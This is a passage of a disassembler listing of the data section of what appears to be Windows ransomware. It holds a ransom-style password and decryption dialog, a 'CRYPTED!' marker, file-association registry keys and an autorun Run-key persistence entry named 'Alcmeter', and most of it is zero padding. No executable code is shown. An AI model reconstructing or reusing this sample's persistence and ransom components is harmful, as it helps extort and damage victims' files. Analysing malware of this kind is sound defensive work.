.data:0040422D                 db 'roken.',0
.data:00404234 ; CHAR Text
.data:00404234 Text            db 0CFh                 ; DATA XREF: sub_401216+10↑o
.data:00404235                 db 0E0h
.data:00404236                 db 0F0h
.data:00404237                 db 0EEh
.data:00404238                 db 0EBh
.data:00404239                 db 0FCh
.data:0040423A                 db  20h
.data:0040423B                 db 0E2h
.data:0040423C                 db 0E2h
.data:0040423D                 db 0E5h
.data:0040423E                 db 0E4h
.data:0040423F                 db 0B8h
.data:00404240                 db 0EDh
.data:00404241                 db  20h
.data:00404242                 db 0E2h
.data:00404243                 db 0E5h
.data:00404244                 db 0F0h
.data:00404245                 db 0EDh
.data:00404246                 db 0EEh
.data:00404247                 db  2Eh ; .
.data:00404248                 db  20h
.data:00404249                 db 0CDh
.data:0040424A                 db 0E0h
.data:0040424B                 db 0E6h
.data:0040424C                 db 0E8h
.data:0040424D                 db 0F2h
.data:0040424E                 db 0E5h
.data:0040424F                 db  20h
.data:00404250                 db  4Fh ; O
.data:00404251                 db  4Bh ; K
.data:00404252                 db  20h
.data:00404253                 db 0E4h
.data:00404254                 db 0EBh
.data:00404255                 db 0FFh
.data:00404256                 db  20h
.data:00404257                 db 0EDh
.data:00404258                 db 0E0h
.data:00404259                 db 0F7h
.data:0040425A                 db 0E0h
.data:0040425B                 db 0EBh
.data:0040425C                 db 0E0h
.data:0040425D                 db  20h
.data:0040425E                 db 0F0h
.data:0040425F                 db 0E0h
.data:00404260                 db 0F1h
.data:00404261                 db 0F8h
.data:00404262                 db 0E8h
.data:00404263                 db 0F4h
.data:00404264                 db 0F0h
.data:00404265                 db 0EEh
.data:00404266                 db 0E2h
.data:00404267                 db 0EAh
.data:00404268                 db 0E8h
.data:00404269                 db  20h
.data:0040426A                 db 0F4h
.data:0040426B                 db 0E0h
.data:0040426C                 db 0E9h
.data:0040426D                 db 0EBh
.data:0040426E                 db 0EEh
.data:0040426F                 db 0E2h
.data:00404270                 db  2Eh ; .
.data:00404271                 db  20h
.data:00404272                 db 0CFh
.data:00404273                 db 0EEh
.data:00404274                 db 0F1h
.data:00404275                 db 0EBh
.data:00404276                 db 0E5h
.data:00404277                 db  20h
.data:00404278                 db 0EDh
.data:00404279                 db 0E0h
.data:0040427A                 db 0E6h
.data:0040427B                 db 0E0h
.data:0040427C                 db 0F2h
.data:0040427D                 db 0E8h
.data:0040427E                 db 0FFh
.data:0040427F                 db  20h
.data:00404280                 db 0EDh
.data:00404281                 db 0E5h
.data:00404282                 db  20h
.data:00404283                 db 0E7h
.data:00404284                 db 0E0h
.data:00404285                 db 0EAh
.data:00404286                 db 0F0h
.data:00404287                 db 0FBh
.data:00404288                 db 0E2h
.data:00404289                 db 0E0h
.data:0040428A                 db 0E9h
.data:0040428B                 db 0F2h
.data:0040428C                 db 0E5h
.data:0040428D                 db  20h
.data:0040428E                 db 0EFh
.data:0040428F                 db 0F0h
.data:00404290                 db 0EEh
.data:00404291                 db 0E3h
.data:00404292                 db 0F0h
.data:00404293                 db 0E0h
.data:00404294                 db 0ECh
.data:00404295                 db 0ECh
.data:00404296                 db 0F3h
.data:00404297                 db  20h
.data:00404298                 db 0E4h
.data:00404299                 db 0EEh
.data:0040429A                 db  20h
.data:0040429B                 db 0EFh
.data:0040429C                 db 0EEh
.data:0040429D                 db 0FFh
.data:0040429E                 db 0E2h
.data:0040429F                 db 0EBh
.data:004042A0                 db 0E5h
.data:004042A1                 db 0EDh
.data:004042A2                 db 0E8h
.data:004042A3                 db 0FFh
.data:004042A4                 db  20h
.data:004042A5                 db 0F1h
.data:004042A6                 db 0EEh
.data:004042A7                 db 0EEh
.data:004042A8                 db 0E1h
.data:004042A9                 db 0F9h
.data:004042AA                 db 0E5h
.data:004042AB                 db 0EDh
.data:004042AC                 db 0E8h
.data:004042AD                 db 0FFh
.data:004042AE                 db  20h
.data:004042AF                 db 0EEh
.data:004042B0                 db 0E1h
.data:004042B1                 db  20h
.data:004042B2                 db 0F3h
.data:004042B3                 db 0E4h
.data:004042B4                 db 0E0h
.data:004042B5                 db 0F7h
.data:004042B6                 db 0EDh
.data:004042B7                 db 0EEh
.data:004042B8                 db 0ECh
.data:004042B9                 db  20h
.data:004042BA                 db 0E7h
.data:004042BB                 db 0E0h
.data:004042BC                 db 0E2h
.data:004042BD                 db 0E5h
.data:004042BE                 db 0F0h
.data:004042BF                 db 0F8h
.data:004042C0                 db 0E5h
.data:004042C1                 db 0EDh
.data:004042C2                 db 0E8h
.data:004042C3                 db 0E8h
.data:004042C4                 db  20h
.data:004042C5                 db 0F0h
.data:004042C6                 db 0E0h
.data:004042C7                 db 0F1h
.data:004042C8                 db 0F8h
.data:004042C9                 db 0E8h
.data:004042CA                 db 0F4h
.data:004042CB                 db 0F0h
.data:004042CC                 db 0EEh
.data:004042CD                 db 0E2h
.data:004042CE                 db 0EAh
.data:004042CF                 db 0E8h
.data:004042D0                 db  20h
.data:004042D1                 db 0F4h
.data:004042D2                 db 0E0h
.data:004042D3                 db 0E9h
.data:004042D4                 db 0EBh
.data:004042D5                 db 0EEh
.data:004042D6                 db 0E2h
.data:004042D7                 db  2Eh ; .
.data:004042D8                 db    0
.data:004042D9 ; CHAR aEnteredPasswor[]
.data:004042D9 aEnteredPasswor db 'Entered password is correct. Press OK to start decrypting of file'
.data:004042D9                                         ; DATA XREF: sub_401216+25↑o
.data:0040431A                 db 's. Dont close window and wait until message "Files have been decr'
.data:0040435B                 db 'ypted successfully!" appears.',0
.data:00404379 ; CHAR Class[]
.data:00404379 Class           db 'REG_SZ',0           ; DATA XREF: sub_402422+17↑o
.data:00404380 ; CHAR aDefaulticon[]
.data:00404380 aDefaulticon    db '\DefaultIcon',0     ; DATA XREF: sub_402342+60↑o
.data:0040438D ; CHAR aShellOpenComma[]
.data:0040438D aShellOpenComma db '\shell\open\command',0
.data:0040438D                                         ; DATA XREF: sub_402342+A6↑o
.data:004043A1                 db '\',0
.data:004043A3 ; CHAR a0[3]
.data:004043A3 a0              db ',0',0               ; DATA XREF: sub_402342+6F↑o
.data:004043A6 ; CHAR SubKey[]
.data:004043A6 SubKey          db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
.data:004043A6                                         ; DATA XREF: start+F3↑o
.data:004043D4 ; CHAR ValueName[]
.data:004043D4 ValueName       db 'Alcmeter',0         ; DATA XREF: start+EE↑o
.data:004043DD ; CHAR aExplorerExe[]
.data:004043DD aExplorerExe    db 'explorer.exe',0     ; DATA XREF: sub_402472+1F↑o
.data:004043EA ; CHAR aCrypted[]
.data:004043EA aCrypted        db 'CRYPTED!',0         ; DATA XREF: sub_402342+38↑o
.data:004043F3 ; CHAR Caption
.data:004043F3 Caption         db 0C2h                 ; DATA XREF: sub_401216+B↑o
.data:004043F3                                         ; sub_40124F+C7↑o ...
.data:004043F4                 db 0EDh
.data:004043F5                 db 0E8h
.data:004043F6                 db 0ECh
.data:004043F7                 db 0E0h
.data:004043F8                 db 0EDh
.data:004043F9                 db 0E8h
.data:004043FA                 db 0E5h
.data:004043FB                 db  21h ; !
.data:004043FC                 db    0
.data:004043FD ; CHAR WindowName[]
.data:004043FD WindowName      db 'Attention!',0       ; DATA XREF: sub_401216+20↑o
.data:004043FD                                         ; sub_40124F+DC↑o ...
.data:00404408 aInfo           db 'Info',0
.data:0040440D ; CHAR aTahoma[]
.data:0040440D aTahoma         db 'Tahoma',0           ; DATA XREF: sub_401AB9:loc_401C63↑o
.data:00404414 ; CHAR byte_404414
.data:00404414 byte_404414     db 0CFh                 ; DATA XREF: sub_401AB9+1FF↑o
.data:00404415                 db 0E0h
.data:00404416                 db 0F0h
.data:00404417                 db 0EEh
.data:00404418                 db 0EBh
.data:00404419                 db 0FCh
.data:0040441A                 db  3Ah ; :
.data:0040441B                 db    0
.data:0040441C ; CHAR aPassword[]
.data:0040441C aPassword       db 'Password:',0        ; DATA XREF: sub_401AB9+21B↑o
.data:00404426 ; CHAR byte_404426
.data:00404426 byte_404426     db 0CEh                 ; DATA XREF: sub_401AB9+248↑o
.data:00404427                 db 0CAh
.data:00404428                 db    0
.data:00404429 ; CHAR asc_404429[4]
.data:00404429 asc_404429      db '???',0              ; DATA XREF: sub_401AB9+27A↑o
.data:0040442D ; CHAR byte_40442D
.data:0040442D byte_40442D     db 0C2h                 ; DATA XREF: sub_401AB9+2E7↑o
.data:0040442E                 db 0FBh
.data:0040442F                 db 0F5h
.data:00404430                 db 0EEh
.data:00404431                 db 0E4h
.data:00404432                 db    0
.data:00404433 ; CHAR aExit[]
.data:00404433 aExit           db 'Exit',0             ; DATA XREF: sub_401AB9+306↑o
.data:00404438 ; CHAR aEdit[]
.data:00404438 aEdit           db 'EDIT',0             ; DATA XREF: sub_401E73+25↑o
.data:0040443D ; CHAR aStatic[]
.data:0040443D aStatic         db 'STATIC',0           ; DATA XREF: sub_401EAB+25↑o
.data:00404444 ; CHAR aButton[]
.data:00404444 aButton         db 'BUTTON',0           ; DATA XREF: sub_401EE0+25↑o
.data:0040444B ; CHAR byte_40444B[4]
.data:0040444B byte_40444B     db 4 dup(0)             ; DATA XREF: sub_401AB9+2AC↑o
.data:0040444B                                         ; sub_402342+24↑o ...
.data:0040444F dword_40444F    dd 0                    ; DATA XREF: sub_4013A8+AF↑w
.data:0040444F                                         ; sub_40124F+88↑w ...
.data:00404453 ; char byte_404453[]
.data:00404453 byte_404453     db 0                    ; DATA XREF: sub_4013A8+B9↑w
.data:00404454 ; char byte_404454[]
.data:00404454 byte_404454     db 0                    ; DATA XREF: sub_4013A8+A2↑w
.data:00404455 byte_404455     db 0                    ; DATA XREF: sub_40124F+9B↑w
.data:00404455                                         ; start+140↑w
.data:00404456 byte_404456     db 0                    ; DATA XREF: sub_40124F+A2↑w
.data:00404456                                         ; start+147↑w
.data:00404457                 db    0
.data:00404458                 db    0
.data:00404459                 db    0
.data:0040445A                 db    0
.data:0040445B                 db    0
.data:0040445C                 db    0
.data:0040445D                 db    0
.data:0040445E                 db    0
.data:0040445F                 db    0
.data:00404460                 db    0
.data:00404461                 db    0
.data:00404462                 db    0
.data:00404463                 db    0
.data:00404464                 db    0
.data:00404465                 db    0
.data:00404466                 db    0
.data:00404467                 db    0
.data:00404468                 db    0
.data:00404469                 db    0
.data:0040446A                 db    0
.data:0040446B                 db    0
.data:0040446C                 db    0
.data:0040446D                 db    0
.data:0040446E                 db    0
.data:0040446F                 db    0
.data:00404470                 db    0
.data:00404471                 db    0
.data:00404472                 db    0
.data:00404473                 db    0
.data:00404474                 db    0
.data:00404475                 db    0
.data:00404476                 db    0
.data:00404477                 db    0
.data:00404478                 db    0
.data:00404479                 db    0
.data:0040447A                 db    0
.data:0040447B                 db    0
.data:0040447C                 db    0
.data:0040447D                 db    0
.data:0040447E                 db    0
.data:0040447F                 db    0
.data:00404480                 db    0
.data:00404481                 db    0
.data:00404482                 db    0
.data:00404483                 db    0
.data:00404484                 db    0
.data:00404485                 db    0
.data:00404486                 db    0
.data:00404487                 db    0
.data:00404488                 db    0
.data:00404489                 db    0
.data:0040448A                 db    0
.data:0040448B                 db    0
.data:0040448C                 db    0
.data:0040448D                 db    0
.data:0040448E                 db    0
.data:0040448F                 db    0
.data:00404490                 db    0
.data:00404491                 db    0
.data:00404492                 db    0
.data:00404493                 db    0
.data:00404494                 db    0
.data:00404495                 db    0
.data:00404496                 db    0
.data:00404497                 db    0
.data:00404498                 db    0
.data:00404499                 db    0
.data:0040449A                 db    0
.data:0040449B                 db    0
.data:0040449C                 db    0
.data:0040449D                 db    0
.data:0040449E                 db    0
.data:0040449F                 db    0
.data:004044A0                 db    0
.data:004044A1                 db    0
.data:004044A2                 db    0
.data:004044A3                 db    0
.data:004044A4                 db    0
.data:004044A5                 db    0
.data:004044A6                 db    0
.data:004044A7                 db    0
.data:004044A8                 db    0
.data:004044A9                 db    0
.data:004044AA                 db    0
.data:004044AB                 db    0
.data:004044AC                 db    0
.data:004044AD                 db    0
.data:004044AE                 db    0
.data:004044AF                 db    0
.data:004044B0                 db    0
.data:004044B1                 db    0
.data:004044B2                 db    0
.data:004044B3                 db    0
.data:004044B4                 db    0
.data:004044B5                 db    0
.data:004044B6                 db    0
.data:004044B7                 db    0
.data:004044B8                 db    0
.data:004044B9                 db    0
.data:004044BA                 db    0
.data:004044BB                 db    0
.data:004044BC                 db    0
.data:004044BD                 db    0
.data:004044BE                 db    0
.data:004044BF                 db    0
.data:004044C0                 db    0
.data:004044C1                 db    0
.data:004044C2                 db    0
.data:004044C3                 db    0
.data:004044C4                 db    0
.data:004044C5                 db    0
.data:004044C6                 db    0
.data:004044C7                 db    0
.data:004044C8                 db    0
.data:004044C9                 db    0
.data:004044CA                 db    0
.data:004044CB                 db    0
.data:004044CC                 db    0
.data:004044CD                 db    0
.data:004044CE                 db    0
.data:004044CF                 db    0
.data:004044D0                 db    0
.data:004044D1                 db    0
.data:004044D2                 db    0
.data:004044D3                 db    0
.data:004044D4                 db    0
.data:004044D5                 db    0
.data:004044D6                 db    0
.data:004044D7                 db    0
.data:004044D8                 db    0
.data:004044D9                 db    0
.data:004044DA                 db    0
.data:004044DB                 db    0
.data:004044DC                 db    0
.data:004044DD                 db    0
.data:004044DE                 db    0
.data:004044DF                 db    0
.data:004044E0                 db    0
.data:004044E1                 db    0
.data:004044E2                 db    0
.data:004044E3                 db    0
.data:004044E4                 db    0
.data:004044E5                 db    0
.data:004044E6                 db    0
.data:004044E7                 db    0
.data:004044E8                 db    0
.data:004044E9                 db    0
.data:004044EA                 db    0
.data:004044EB                 db    0
.data:004044EC                 db    0
.data:004044ED                 db    0
.data:004044EE                 db    0
.data:004044EF                 db    0
.data:004044F0                 db    0
.data:004044F1                 db    0
.data:004044F2                 db    0
.data:004044F3                 db    0
.data:004044F4                 db    0
.data:004044F5                 db    0
.data:004044F6                 db    0
.data:004044F7                 db    0
.data:004044F8                 db    0
.data:004044F9                 db    0
.data:004044FA                 db    0
.data:004044FB                 db    0
.data:004044FC                 db    0
.data:004044FD                 db    0
.data:004044FE                 db    0
.data:004044FF                 db    0
.data:00404500                 db    0
.data:00404501                 db    0
.data:00404502                 db    0
.data:00404503                 db    0
.data:00404504                 db    0
.data:00404505                 db    0
.data:00404506                 db    0
.data:00404507                 db    0
.data:00404508                 db    0
.data:00404509                 db    0
.data:0040450A                 db    0
.data:0040450B                 db    0
.data:0040450C                 db    0
.data:0040450D                 db    0
.data:0040450E                 db    0
.data:0040450F                 db    0
.data:00404510                 db    0
.data:00404511                 db    0
.data:00404512                 db    0
.data:00404513                 db    0
.data:00404514                 db    0
.data:00404515                 db    0
.data:00404516                 db    0
.data:00404517                 db    0
.data:00404518                 db    0
.data:00404519                 db    0
.data:0040451A                 db    0
.data:0040451B                 db    0
.data:0040451C                 db    0
.data:0040451D                 db    0
.data:0040451E                 db    0
.data:0040451F                 db    0
.data:00404520                 db    0
.data:00404521                 db    0
.data:00404522                 db    0
.data:00404523                 db    0
.data:00404524                 db    0
.data:00404525                 db    0
.data:00404526                 db    0
.data:00404527                 db    0
.data:00404528                 db    0
.data:00404529                 db    0
.data:0040452A                 db    0
.data:0040452B                 db    0
.data:0040452C                 db    0
.data:0040452D                 db    0
.data:0040452E                 db    0
.data:0040452F                 db    0
.data:00404530                 db    0
.data:00404531                 db    0
.data:00404532                 db    0
.data:00404533                 db    0
.data:00404534                 db    0
.data:00404535                 db    0
.data:00404536                 db    0
.data:00404537                 db    0
.data:00404538                 db    0
.data:00404539                 db    0
.data:0040453A                 db    0
.data:0040453B                 db    0
.data:0040453C                 db    0
.data:0040453D                 db    0
.data:0040453E                 db    0
.data:0040453F                 db    0
.data:00404540                 db    0
.data:00404541                 db    0
.data:00404542                 db    0
.data:00404543                 db    0
.data:00404544                 db    0
.data:00404545                 db    0
.data:00404546                 db    0
.data:00404547                 db    0
.data:00404548                 db    0
.data:00404549                 db    0
.data:0040454A                 db    0
.data:0040454B                 db    0
.data:0040454C                 db    0
.data:0040454D                 db    0
.data:0040454E                 db    0
.data:0040454F                 db    0
.data:00404550                 db    0
.data:00404551                 db    0
.data:00404552                 db    0
.data:00404553                 db    0
.data:00404554                 db    0
.data:00404555                 db    0
.data:00404556                 db    0
.data:00404557                 db    0
.data:00404558                 db    0
.data:00404559                 db    0
.data:0040455A                 db    0
.data:0040455B                 db    0
.data:0040455C                 db    0
.data:0040455D                 db    0
.data:0040455E                 db    0
.data:0040455F                 db    0
.data:00404560                 db    0
.data:00404561                 db    0
.data:00404562                 db    0
.data:00404563                 db    0
.data:00404564                 db    0
.data:00404565                 db    0
.data:00404566                 db    0
.data:00404567                 db    0
.data:00404568                 db    0
.data:00404569                 db    0
.data:0040456A                 db    0
.data:0040456B                 db    0
.data:0040456C                 db    0
.data:0040456D                 db    0
.data:0040456E                 db    0
.data:0040456F                 db    0
.data:00404570                 db    0
.data:00404571                 db    0
.data:00404572                 db    0
.data:00404573                 db    0
.data:00404574                 db    0
.data:00404575                 db    0
.data:00404576                 db    0
.data:00404577                 db    0
.data:00404578                 db    0
.data:00404579                 db    0
.data:0040457A                 db    0
.data:0040457B                 db    0
.data:0040457C                 db    0
.data:0040457D                 db    0
.data:0040457E                 db    0
.data:0040457F                 db    0
.data:00404580                 db    0
.data:00404581                 db    0
.data:00404582                 db    0
.data:00404583                 db    0
.data:00404584                 db    0
.data:00404585                 db    0
.data:00404586                 db    0
.data:00404587                 db    0
.data:00404588                 db    0
.data:00404589                 db    0
.data:0040458A                 db    0
.data:0040458B                 db    0
.data:0040458C                 db    0
.data:0040458D                 db    0
.data:0040458E                 db    0
.data:0040458F                 db    0
.data:00404590                 db    0
.data:00404591                 db    0
.data:00404592                 db    0
.data:00404593                 db    0
.data:00404594                 db    0
.data:00404595                 db    0
.data:00404596                 db    0
.data:00404597                 db    0
.data:00404598                 db    0
.data:00404599                 db    0
.data:0040459A                 db    0
.data:0040459B                 db    0
.data:0040459C                 db    0
.data:0040459D                 db    0
.data:0040459E                 db    0
.data:0040459F                 db    0
.data:004045A0                 db    0
.data:004045A1                 db    0
.data:004045A2                 db    0
.data:004045A3                 db    0
.data:004045A4                 db    0
.data:004045A5                 db    0
.data:004045A6                 db    0
.data:004045A7                 db    0
.data:004045A8                 db    0
.data:004045A9                 db    0
.data:004045AA                 db    0
.data:004045AB                 db    0
.data:004045AC                 db    0
.data:004045AD                 db    0
.data:004045AE                 db    0
.data:004045AF                 db    0
.data:004045B0                 db    0
.data:004045B1                 db    0
.data:004045B2                 db    0
.data:004045B3                 db    0
.data:004045B4                 db    0
.data:004045B5                 db    0
.data:004045B6                 db    0
.data:004045B7                 db    0
.data:004045B8                 db    0
.data:004045B9                 db    0
.data:004045BA                 db    0
.data:004045BB                 db    0
.data:004045BC                 db    0
.data:004045BD                 db    0
.data:004045BE                 db    0
.data:004045BF                 db    0
.data:004045C0                 db    0
.data:004045C1                 db    0
.data:004045C2                 db    0
.data:004045C3                 db    0
.data:004045C4                 db    0
.data:004045C5                 db    0
.data:004045C6                 db    0
.data:004045C7                 db    0
.data:004045C8                 db    0
.data:004045C9                 db    0
.data:004045CA                 db    0
.data:004045CB                 db    0
.data:004045CC                 db    0
.data:004045CD                 db    0
.data:004045CE                 db    0
.data:004045CF                 db    0
.data:004045D0                 db    0
.data:004045D1                 db    0
.data:004045D2                 db    0
.data:004045D3                 db    0
.data:004045D4                 db    0
.data:004045D5                 db    0
.data:004045D6                 db    0
.data:004045D7                 db    0
.data:004045D8                 db    0
.data:004045D9                 db    0
.data:004045DA                 db    0
.data:004045DB                 db    0
.data:004045DC                 db    0
.data:004045DD                 db    0
.data:004045DE                 db    0
.data:004045DF                 db    0
.data:004045E0                 db    0
.data:004045E1                 db    0
.data:004045E2                 db    0
.data:004045E3                 db    0
.data:004045E4                 db    0
.data:004045E5                 db    0
.data:004045E6                 db    0
.data:004045E7                 db    0
.data:004045E8                 db    0
.data:004045E9                 db    0
.data:004045EA                 db    0
.data:004045EB                 db    0
.data:004045EC                 db    0
.data:004045ED                 db    0
.data:004045EE                 db    0
.data:004045EF                 db    0
.data:004045F0                 db    0
.data:004045F1                 db    0
.data:004045F2                 db    0
.data:004045F3                 db    0
.data:004045F4                 db    0
.data:004045F5                 db    0
.data:004045F6                 db    0
.data:004045F7                 db    0
.data:004045F8                 db    0
.data:004045F9                 db    0
.data:004045FA                 db    0
.data:004045FB                 db    0
.data:004045FC                 db    0
.data:004045FD                 db    0
.data:004045FE                 db    0
.data:004045FF                 db    0
.data:00404600                 db    ? ;
.data:00404601                 db    ? ;
.data:00404602                 db    ? ;
.data:00404603                 db    ? ;
.data:00404604                 db    ? ;
.data:00404605                 db    ? ;
.data:00404606                 db    ? ;
.data:00404607                 db    ? ;
.data:00404608                 db    ? ;
.data:00404609                 db    ? ;
.data:0040460A                 db    ? ;
.data:0040460B                 db    ? ;
.data:0040460C                 db    ? ;
.data:0040460D                 db    ? ;
.data:0040460E                 db    ? ;
.data:0040460F                 db    ? ;
.data:00404610                 db    ? ;
.data:00404611                 db    ? ;
.data:00404612                 db    ? ;
.data:00404613                 db    ? ;
.data:00404614                 db    ? ;
.data:00404615                 db    ? ;
.data:00404616                 db    ? ;
.data:00404617                 db    ? ;
.data:00404618                 db    ? ;
.data:00404619                 db    ? ;
.data:0040461A                 db    ? ;
.data:0040461B                 db    ? ;
.data:0040461C                 db    ? ;
.data:0040461D                 db    ? ;
.data:0040461E                 db    ? ;
.data:0040461F                 db    ? ;
.data:00404620                 db    ? ;
.data:00404621                 db    ? ;
.data:00404622                 db    ? ;
.data:00404623                 db    ? ;
.data:00404624                 db    ? ;
.data:00404625                 db    ? ;
.data:00404626                 db    ? ;
.data:00404627                 db    ? ;
.data:00404628                 db    ? ;
.data:00404629                 db    ? ;
.data:0040462A                 db    ? ;
.data:0040462B                 db    ? ;
.data:0040462C                 db    ? ;
.data:0040462D                 db    ? ;
.data:0040462E                 db    ? ;
.data:0040462F                 db    ? ;
.data:00404630                 db    ? ;
.data:00404631                 db    ? ;
.data:00404632                 db    ? ;
.data:00404633                 db    ? ;
.data:00404634                 db    ? ;
.data:00404635                 db    ? ;
.data:00404636                 db    ? ;
.data:00404637                 db    ? ;
.data:00404638                 db    ? ;
.data:00404639                 db    ? ;
.data:0040463A                 db    ? ;
.data:0040463B                 db    ? ;
.data:0040463C                 db    ? ;
.data:0040463D                 db    ? ;
.data:0040463E                 db    ? ;
.data:0040463F                 db    ? ;
.data:00404640                 db    ? ;
.data:00404641                 db    ? ;
.data:00404642                 db    ? ;
.data:00404643                 db    ? ;
.data:00404644                 db    ? ;
.data:00404645                 db    ? ;
.data:00404646                 db    ? ;
.data:00404647                 db    ? ;
.data:00404648                 db    ? ;
.data:00404649                 db    ? ;
.data:0040464A                 db    ? ;
.data:0040464B                 db    ? ;
.data:0040464C                 db    ? ;
.data:0040464D                 db    ? ;
.data:0040464E                 db    ? ;
.data:0040464F                 db    ? ;
.data:00404650                 db    ? ;
.data:00404651                 db    ? ;
.data:00404652                 db    ? ;
.data:00404653                 db    ? ;
.data:00404654                 db    ? ;
.data:00404655                 db    ? ;
.data:00404656                 db    ? ;
.data:00404657                 db    ? ;
.data:00404658                 db    ? ;
.data:00404659                 db    ? ;
.data:0040465A                 db    ? ;
.data:0040465B                 db    ? ;
.data:0040465C                 db    ? ;
.data:0040465D                 db    ? ;
.data:0040465E                 db    ? ;
.data:0040465F                 db    ? ;
.data:00404660                 db    ? ;
.data:00404661                 db    ? ;
.data:00404662                 db    ? ;
.data:00404663                 db    ? ;
.data:00404664                 db    ? ;
.data:00404665                 db    ? ;
.data:00404666                 db    ? ;
.data:00404667                 db    ? ;
.data:00404668                 db    ? ;
.data:00404669                 db    ? ;
.data:0040466A                 db    ? ;
.data:0040466B                 db    ? ;
.data:0040466C                 db    ? ;
.data:0040466D                 db    ? ;
.data:0040466E                 db    ? ;
.data:0040466F                 db    ? ;
.data:00404670                 db    ? ;
.data:00404671                 db    ? ;
.data:00404672                 db    ? ;
.data:00404673                 db    ? ;
.data:00404674                 db    ? ;
.data:00404675                 db    ? ;
.data:00404676                 db    ? ;
.data:00404677                 db    ? ;
.data:00404678                 db    ? ;
.data:00404679                 db    ? ;
.data:0040467A                 db    ? ;
.data:0040467B                 db    ? ;
.data:0040467C                 db    ? ;
.data:0040467D                 db    ? ;
.data:0040467E                 db    ? ;
.data:0040467F                 db    ? ;
.data:00404680                 db    ? ;
.data:00404681                 db    ? ;
.data:00404682                 db    ? ;
.data:00404683                 db    ? ;
.data:00404684                 db    ? ;
.data:00404685                 db    ? ;
.data:00404686                 db    ? ;
.data:00404687                 db    ? ;
.data:00404688                 db    ? ;
.data:00404689                 db    ? ;
.data:0040468A                 db    ? ;
.data:0040468B                 db    ? ;
.data:0040468C                 db    ? ;
.data:0040468D                 db    ? ;
.data:0040468E                 db    ? ;
.data:0040468F                 db    ? ;
.data:00404690                 db    ? ;
.data:00404691                 db    ? ;
.data:00404692                 db    ? ;
.data:00404693                 db    ? ;
.data:00404694                 db    ? ;
.data:00404695                 db    ? ;
.data:00404696                 db    ? ;
.data:00404697                 db    ? ;
.data:00404698                 db    ? ;
.data:00404699                 db    ? ;
.data:0040469A                 db    ? ;
.data:0040469B                 db    ? ;
.data:0040469C                 db    ? ;
.data:0040469D                 db    ? ;
.data:0040469E                 db    ? ;
.data:0040469F                 db    ? ;
.data:004046A0                 db    ? ;
.data:004046A1                 db    ? ;
.data:004046A2                 db    ? ;
.data:004046A3                 db    ? ;
.data:004046A4                 db    ? ;
.data:004046A5                 db    ? ;
.data:004046A6                 db    ? ;
.data:004046A7                 db    ? ;
.data:004046A8                 db    ? ;
.data:004046A9                 db    ? ;
.data:004046AA                 db    ? ;
.data:004046AB                 db    ? ;
.data:004046AC                 db    ? ;
.data:004046AD                 db    ? ;
.data:004046AE                 db    ? ;
.data:004046AF                 db    ? ;
.data:004046B0                 db    ? ;
.data:004046B1                 db    ? ;
.data:004046B2                 db    ? ;
.data:004046B3                 db    ? ;
.data:004046B4                 db    ? ;
.data:004046B5                 db    ? ;
.data:004046B6                 db    ? ;
.data:004046B7                 db    ? ;
.data:004046B8                 db    ? ;
.data:004046B9                 db    ? ;
.data:004046BA                 db    ? ;
.data:004046BB                 db    ? ;
.data:004046BC                 db    ? ;
.data:004046BD                 db    ? ;
.data:004046BE                 db    ? ;
.data:004046BF                 db    ? ;
.data:004046C0                 db    ? ;
.data:004046C1                 db    ? ;
.data:004046C2                 db    ? ;
.data:004046C3                 db    ? ;
.data:004046C4                 db    ? ;
.data:004046C5                 db    ? ;
.data:004046C6                 db    ? ;
.data:004046C7                 db    ? ;
.data:004046C8                 db    ? ;
.data:004046C9                 db    ? ;
.data:004046CA                 db    ? ;
.data:004046CB                 db    ? ;
.data:004046CC                 db    ? ;
.data:004046CD                 db    ? ;
.data:004046CE                 db    ? ;
.data:004046CF                 db    ? ;
.data:004046D0                 db    ? ;
.data:004046D1                 db    ? ;
.data:004046D2                 db    ? ;
.data:004046D3                 db    ? ;
.data:004046D4                 db    ? ;
.data:004046D5                 db    ? ;
.data:004046D6                 db    ? ;
.data:004046D7                 db    ? ;
.data:004046D8                 db    ? ;
.data:004046D9                 db    ? ;
.data:004046DA                 db    ? ;
.data:004046DB                 db    ? ;
.data:004046DC                 db    ? ;
.data:004046DD                 db    ? ;
.data:004046DE                 db    ? ;
.data:004046DF                 db    ? ;
.data:004046E0                 db    ? ;
.data:004046E1                 db    ? ;
.data:004046E2                 db    ? ;
.data:004046E3                 db    ? ;
.data:004046E4                 db    ? ;
.data:004046E5                 db    ? ;
.data:004046E6                 db    ? ;
.data:004046E7                 db    ? ;
.data:004046E8                 db    ? ;
.data:004046E9                 db    ? ;
.data:004046EA                 db    ? ;
.data:004046EB                 db    ? ;
.data:004046EC                 db    ? ;
.data:004046ED                 db    ? ;
.data:004046EE                 db    ? ;
.data:004046EF                 db    ? ;
.data:004046F0                 db    ? ;
.data:004046F1                 db    ? ;
.data:004046F2                 db    ? ;
.data:004046F3                 db    ? ;
.data:004046F4                 db    ? ;
.data:004046F5                 db    ? ;
.data:004046F6                 db    ? ;
.data:004046F7                 db    ? ;
.data:004046F8                 db    ? ;
.data:004046F9                 db    ? ;
.data:004046FA                 db    ? ;
.data:004046FB                 db    ? ;
.data:004046FC                 db    ? ;
.data:004046FD                 db    ? ;
.data:004046FE                 db    ? ;
.data:004046FF                 db    ? ;
.data:00404700                 db    ? ;
.data:00404701                 db    ? ;
.data:00404702                 db    ? ;
.data:00404703                 db    ? ;
.data:00404704                 db    ? ;
.data:00404705                 db    ? ;
.data:00404706                 db    ? ;
.data:00404707                 db    ? ;
.data:00404708                 db    ? ;
.data:00404709                 db    ? ;
.data:0040470A                 db    ? ;
.data:0040470B                 db    ? ;
.data:0040470C                 db    ? ;
.data:0040470D                 db    ? ;
.data:0040470E                 db    ? ;
.data:0040470F                 db    ? ;
.data:00404710                 db    ? ;
.data:00404711                 db    ? ;
.data:00404712                 db    ? ;
.data:00404713                 db    ? ;
.data:00404714                 db    ? ;
.data:00404715                 db    ? ;
.data:00404716                 db    ? ;
.data:00404717                 db    ? ;
.data:00404718                 db    ? ;
.data:00404719                 db    ? ;
.data:0040471A                 db    ? ;
.data:0040471B                 db    ? ;
.data:0040471C                 db    ? ;
.data:0040471D                 db    ? ;
.data:0040471E                 db    ? ;
.data:0040471F                 db    ? ;
.data:00404720                 db    ? ;
.data:00404721                 db    ? ;
.data:00404722                 db    ? ;
.data:00404723                 db    ? ;
.data:00404724                 db    ? ;
.data:00404725                 db    ? ;
.data:00404726                 db    ? ;
.data:00404727                 db    ? ;
.data:00404728                 db    ? ;
.data:00404729                 db    ? ;
.data:0040472A                 db    ? ;
.data:0040472B                 db    ? ;
.data:0040472C                 db    ? ;
